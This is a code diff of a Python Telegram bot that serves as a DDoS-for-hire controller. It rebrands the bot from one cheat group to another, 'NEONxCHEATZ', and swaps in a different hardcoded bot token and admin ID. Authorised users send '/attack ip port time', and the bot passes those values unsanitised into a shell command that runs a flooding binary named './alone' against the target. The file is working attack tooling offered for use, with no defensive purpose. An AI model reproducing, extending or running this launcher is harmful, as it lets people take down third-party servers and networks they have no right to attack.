@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7140094105:AAEcteoZXkxDKcv97XhGhkC-wokOUW-2a6k'
-ADMIN_USER_ID = 1662672529
+TELEGRAM_BOT_TOKEN = '7240194618:AAFfqpHZNse_7jKlmSn3Kx1ZbRz5p-UI38M'
+ADMIN_USER_ID = 6654576379
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -23,10 +23,10 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝐓𝐎 𝗚𝗢𝗗𝘅𝗖𝗛𝗘𝗔𝗧𝗦 𝗗𝗗𝗢𝗦*\n\n"
-        "* 𝐞𝐱𝐚𝐦𝐩𝐥𝐞 : /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧>*\n\n"
-        "*𝐣𝐨𝐢𝐧 𝐦𝐲 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐚𝐧𝐧𝐞𝐥\n\n"
-        "*https://t.me/+03wLVBPurPk2NWRl*"                  
+        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 NEONxCHEATZ 𝗗𝗱𝗼𝘀*\n"
+        "*🔥 𝗢𝘄𝗻𝗲𝗿 @NEONxCHEATZ3*\n"
+        "*🔥 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 @NEONxCHEATZ2*\n"    
+        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -35,13 +35,11 @@ async def manage(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐚𝐜𝐜𝐞𝐬𝐬 𝐝𝐞𝐧𝐢𝐞𝐝 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 *\n"
-                                                             "*@GODxAloneBOY*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @NEONxCHEATZ3*", parse_mode='Markdown')
         return
 
     if len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="*𝐮𝐬𝐬𝐚𝐠𝐞 /manage add 12345678 𝐟𝐨𝐫 𝐚𝐝𝐝 𝐧𝐞𝐰 𝐮𝐬𝐞𝐫*\n"
-                                                          "*𝐮𝐬𝐬𝐚𝐠𝐞 /manage rem 12345678 𝐟𝐨𝐫 𝐫𝐞𝐦𝐨𝐯𝐞 𝐨𝐥𝐝 𝐮𝐬𝐞𝐫*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
         return
 
     command, target_user_id = args
@@ -50,11 +48,11 @@ async def manage(update: Update, context: CallbackContext):
     if command == 'add':
         users.add(target_user_id)
         save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐮𝐬𝐞𝐫 {target_user_id} 𝐚𝐝𝐝𝐞𝐝.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode='Markdown')
     elif command == 'rem':
         users.discard(target_user_id)
         save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐮𝐬𝐞𝐫 {target_user_id} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
 
 async def run_attack(chat_id, ip, port, time, context):
     global attack_in_progress
@@ -62,7 +60,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./alone {ip} {port} {time} 7890",
+            f"./alone {ip} {port} {time} 20",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -74,11 +72,11 @@ async def run_attack(chat_id, ip, port, time, context):
             print(f"[stderr]\n{stderr.decode()}")
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝐞𝐫𝐫𝐨𝐫 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤: {str(e)}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*😈 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 😈*\n*𝐬𝐞𝐧𝐝 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 - @GODxAloneBOY*\n*https://t.me/+03wLVBPurPk2NWRl*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @NEONxCHEATZ3*\n*🔥 Channel @NEONxCHEATZ2*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -88,24 +86,25 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐚𝐜𝐜𝐞𝐬𝐬 𝐝𝐞𝐧𝐢𝐞𝐝 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 *\n"
-                                                            "*@GODxAloneBOY*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @NEONxCHEATZ3*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*𝐰𝐚𝐢𝐭 𝐤𝐚𝐫 𝐥𝐚𝐮𝐝𝐞 3 𝐦𝐢𝐧𝐮𝐭𝐬 𝐧𝐞𝐱𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐤𝐞 𝐥𝐢𝐲𝐞 𝐮𝐬𝐞 /attack*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⭐ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 3 𝐓𝐨 5 𝐌𝐢𝐧𝐮𝐭𝐞 𝐅𝐨𝐫 𝐍𝐞𝐱𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 /attack*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*𝐞𝐱𝐚𝐦𝐩𝐥𝐞 : /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip port time*", parse_mode='Markdown')
         return
 
     ip, port, time = args
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*😈 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 😈 *\n"
-        f"* 𝐭𝐚𝐫𝐠𝐞𝐭 » {ip}*\n"
-        f"* 𝐩𝐨𝐫𝐭 » {port}*\n"
-        f"* 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧 » {time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*"           
+        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
+        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
+        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
+        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
+        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @NEONxCHEATZ3*\n"        
+        f"*🔥 𝗖𝗵𝗮𝗻𝗲𝗹 @NEONxCHEATZ2*"           
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, time, context))
